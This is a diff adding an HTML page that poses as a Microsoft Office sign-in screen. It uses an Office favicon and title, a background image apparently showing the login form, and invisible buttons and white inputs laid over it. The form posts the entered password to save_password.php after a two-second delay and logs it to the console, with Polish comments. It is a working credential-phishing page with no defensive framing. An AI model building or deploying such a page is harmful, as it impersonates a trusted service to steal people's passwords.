@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=15vw, initial-scale=1.0">
+    <title>Microsoft Office</title>
+    <link rel="icon" type="image/x-icon" href="office.png">
+    <style>
+        body {
+            background-image: url('franek.png');
+        }
+
+        #mail {
+            background-color: white;
+            border: none;
+            width: 15vw;
+            margin-top: 37.5vh;
+            margin-left: 38vw;
+            font-size: 15px;
+        }
+
+        #dalej {
+            background-color: transparent;
+            margin-top: 13.5vh;
+            margin-left: 53.5vw;
+            width: 6.5vw;
+            height: 4vh;
+            border: none;
+            cursor: pointer;
+        }
+
+        #haslo {
+            background-color: white;
+            border: none;
+            width: 15vw;
+            margin-top: 47vh;
+            margin-left: 38.7vw;
+            font-size: 15px;
+        }
+
+        #zaloguj {
+            background-color: transparent;
+            margin-top: 8.7vh;
+            margin-left: 54vw;
+            width: 6.5vw;
+            height: 4vh;
+            border: none;
+            cursor: pointer;
+            transition-delay: 2s;
+        }
+    </style>
+</head>
+<body>
+
+<form id="myForm" action="save_password.php" method="post">
+    <input type="password" name="haslo" placeholder="Hasło" id="haslo"><br>
+    <button type="submit" onclick="delaySubmit(event)" id="zaloguj"></button>
+</form>
+
+<script>
+function delaySubmit(event) {
+    event.preventDefault(); // Zapobiega natychmiastowemu przesłaniu formularza
+
+    // Pobieranie wartości z inputa hasła
+    const haslo = document.getElementById('haslo').value;
+    console.log("Wprowadzone hasło: " + haslo); // Wyświetlanie hasła w konsoli (do testów)
+
+    // Dodaj opóźnienie przed wysłaniem formularza
+    setTimeout(function() {
+        document.getElementById('myForm').submit(); // Przesyłanie formularza po opóźnieniu
+    }, 2000);
+}
+</script>
+
+</body>
+</html>
